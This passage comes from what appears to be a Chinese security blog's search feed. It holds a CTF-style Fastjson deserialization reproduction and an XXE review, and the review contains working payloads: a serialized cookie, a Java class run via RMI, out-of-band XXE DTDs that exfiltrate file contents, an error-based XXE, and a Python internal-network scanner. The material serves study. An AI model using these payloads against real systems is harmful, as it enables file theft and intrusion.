//注意java的字符串必须是双引号</code></pre><p>生成payload</p><pre><code>bvik1nAmjEAllRdn5UKWGC9uCj0hW0P2B6k1uigkS1acKxD9b_xNi-x09UGgjU1DvDEI2GGk4Jn0ApM_cSVc0G7kGnvvtewNRVsfqFUCR0fMAPqbj6yqACW6XVtt8Fp1nBwebKd7pkYSZCv6Yj3X7H-0-8HDV6F3sS3yWHUQEBPAyiNmKfkSKUV5VVlNdo16Nij8YX8HvKdeMHJ7_5Sdjfmfq3dKPeUOivMyVp_GdEkffgly4YX4eWCOzQRr4uQgodsKw2pC9N9udnw3Fz7O5ZhzmoYttjLubBowMtkF-Q6HHCvBrK9SWCzRQXC6jqYX_XeqyZuDreUixnpXpzlN9Gj_AWy8DB8Dxea8atf2wr8=</code></pre><p>之后登陆再替换掉cookie</p><p><img src="/posts/21b61fbe/1573973547431-1580346732870.png" alt="结果"></p><h2 id="fastjson-反序列化-仅复现"><a href="#fastjson-反序列化-仅复现" class="headerlink" title="fastjson 反序列化(仅复现)"></a>fastjson 反序列化(仅复现)</h2><p>docker开启环境之后，首先需要生成一个 <code>TouchFile</code> 恶意文件，然后编译成class文件</p><pre><code class="java">// javac TouchFile.javaimport java.lang.Runtime;import java.lang.Process;public class TouchFile {    static {        try {            Runtime rt = Runtime.getRuntime();            String[] commands = {&quot;touch&quot;, &quot;/tmp/success&quot;};            Process pc = rt.exec(commands);            pc.waitFor();        } catch (Exception e) {            // do nothing        }    }}</code></pre><p>用python开一个服务器，监听8001端口</p><p>再开启一个rmi服务器，靶机ip为192.168.99.100，本机相对靶机是192.168.99.1</p><p><img src="/posts/21b61fbe/1580469670376.png" alt></p><p>这时候将payload发送过去，payload只是演示了在 tmp 目录下创建文件</p><p><img src="/posts/21b61fbe/1580469645918.png" alt></p><p>创建成功</p><p><img src="/posts/21b61fbe/1580469708254.png" alt></p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://blog.chaitin.cn/2015-11-11_java_unserialize_rce/#h4.1_%E5%88%A9%E7%94%A8%E8%BF%87%E7%A8%8B%E6%A6%82%E8%BF%B0" target="_blank" rel="noopener">Java反序列化漏洞通用利用分析</a></p>]]></content>
      
      
      <categories>
          
          <category> 代码审计 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java </tag>
            
            <tag> 反序列化 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XXE复习</title>
      <link href="/posts/2e545689/"/>
      <url>/posts/2e545689/</url>
      
        <content type="html"><![CDATA[<h1 id="XXE"><a href="#XXE" class="headerlink" title="XXE"></a>XXE</h1><h2 id="常用payload分析"><a href="#常用payload分析" class="headerlink" title="常用payload分析"></a>常用payload分析</h2><p>好像大家都用这个测试代码</p><pre><code class="php">&lt;?phplibxml_disable_entity_loader(false);$xmlfile = file_get_contents(&quot;php://input&quot;);$dom = new DOMDocument();$dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);$creds = simplexml_import_dom($dom);var_dump($creds);</code></pre><p>使用XML发送数据：</p><pre><code class="xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE root[&lt;!ENTITY a SYSTEM &quot;http://localhost:8887/aaaaa&quot;&gt;]&gt;&lt;root&gt;&amp;a;&lt;/root&gt;</code></pre><p>但是我在尝试参数实体的时候似乎不能外带数据</p><pre><code class="xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE root[&lt;!ENTITY % a &quot;http://localhost:8887/aaa&quot;&gt;%a;]&gt;&lt;root&gt;&lt;/root&gt;</code></pre><p><img src="/posts/2e545689/1580302730124.png" alt></p><p>嵌套也是不行的</p><pre><code class="xml">&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE message [    &lt;!ENTITY % file SYSTEM &quot;file:///flag.txt&quot;&gt;      &lt;!ENTITY % start &quot;&lt;!ENTITY &amp;#x25; send SYSTEM &#39;http://localhost:8887/?%file;&#39;&gt;&quot;&gt;    %start;    %send;]&gt;</code></pre><p>最常用的外带数据的方法：</p><p>在自己的vps上准备两个文件，我这里就就都在本机做的实验</p><p>本地的8001端口开一个web服务，</p><p><img src="/posts/2e545689/1580302833010-1580342074917.png" alt></p><p><code>local.xml</code> 文件内容：</p><pre><code class="xml">&lt;!ENTITY % start &quot;&lt;!ENTITY &amp;#x25; send SYSTEM &#39;http://localhost:8887/?%file;&#39;&gt;&quot;&gt;%start;</code></pre><p>这个文件表示读取到数据之后发送给另一个8887端口，然后我们向受害者服务器发送数据，</p><pre><code class="xml">&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE message [    &lt;!ENTITY % remote SYSTEM &quot;http://localhost:8001/local.xml&quot;&gt;      &lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=./flag.txt&quot;&gt;    %remote;    %send;]&gt;&lt;message&gt;1234&lt;/message&gt;</code></pre><p>然后就可以在8887端口接收到数据了</p><p><img src="/posts/2e545689/1580302962486-1580342120888.png" alt></p><p>换一种 <code>payload</code> 也行</p><p>DTD文件</p><pre><code class="xml">&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=file:///flag&quot;&gt;&lt;!ENTITY % int &quot;&lt;!ENTITY &amp;#37; send SYSTEM &#39;http://localhost:8887/p=%file;&#39;&gt;&quot;&gt;</code></pre><p>发送的 paylod</p><pre><code class="xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE convert [ &lt;!ENTITY % remote SYSTEM &quot;http://localhost:8001/local.xml&quot;&gt;%remote;%int;%send;]&gt;</code></pre><h2 id="报错XXE"><a href="#报错XXE" class="headerlink" title="报错XXE"></a>报错XXE</h2><p>这个方法p牛其实早就说过了,通过三层嵌套的XML就可以达到报错</p><pre><code class="xml">&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE message [    &lt;!ELEMENT message ANY&gt;    &lt;!ENTITY % para1 SYSTEM &quot;file:///flag&quot;&gt;    &lt;!ENTITY % para &#39;        &lt;!ENTITY &amp;#x25; para2 &quot;&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;file:///&amp;#x25;para1;&amp;#x27;&gt;&quot;&gt;        &amp;#x25;para2;    &#39;&gt;    %para;]&gt;&lt;message&gt;10&lt;/message&gt;</code></pre><p><img src="/posts/2e545689/1580303152983-1580342131433.png" alt></p><h2 id="XXE探测内网"><a href="#XXE探测内网" class="headerlink" title="XXE探测内网"></a>XXE探测内网</h2><pre><code class="xml">import requestsimport base64#Origtional XML that the server accepts#&lt;xml&gt;#    &lt;stuff&gt;user&lt;/stuff&gt;#&lt;/xml&gt;def build_xml(string):    xml = &quot;&quot;&quot;&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;&quot;&quot;&quot;    xml = xml + &quot;\r\n&quot; + &quot;&quot;&quot;&lt;!DOCTYPE foo [ &lt;!ELEMENT foo ANY &gt;&quot;&quot;&quot;    xml = xml + &quot;\r\n&quot; + &quot;&quot;&quot;&lt;!ENTITY xxe SYSTEM &quot;&quot;&quot; + &#39;&quot;&#39; + string + &#39;&quot;&#39; + &quot;&quot;&quot;&gt;]&gt;&quot;&quot;&quot;    xml = xml + &quot;\r\n&quot; + &quot;&quot;&quot;&lt;xml&gt;&quot;&quot;&quot;    xml = xml + &quot;\r\n&quot; + &quot;&quot;&quot;    &lt;stuff&gt;&amp;xxe;&lt;/stuff&gt;&quot;&quot;&quot;    xml = xml + &quot;\r\n&quot; + &quot;&quot;&quot;&lt;/xml&gt;&quot;&quot;&quot;    send_xml(xml)def send_xml(xml):    headers = {&#39;Content-Type&#39;: &#39;application/xml&#39;}    x = requests.post(&#39;http://127.0.0.1/xml.php&#39;, data=xml, headers=headers, timeout=5).text    coded_string = x.split(&#39; &#39;)[-2] # a little split to get only the base64 encoded value    print coded_string#   print base64.b64decode(coded_string)for i in range(1, 255):    try:        i = str(i)        ip = &#39;192.168.1.&#39; + i        string = &#39;php://filter/convert.base64-encode/resource=http://&#39; + ip + &#39;/&#39;        print string        build_xml(string)    except:      print &quot;error&quot;continue</code></pre><h2 id="实例分析"><a href="#实例分析" class="headerlink" title="实例分析"></a>实例分析</h2>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> xxe </tag>
            
            <tag> xml </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
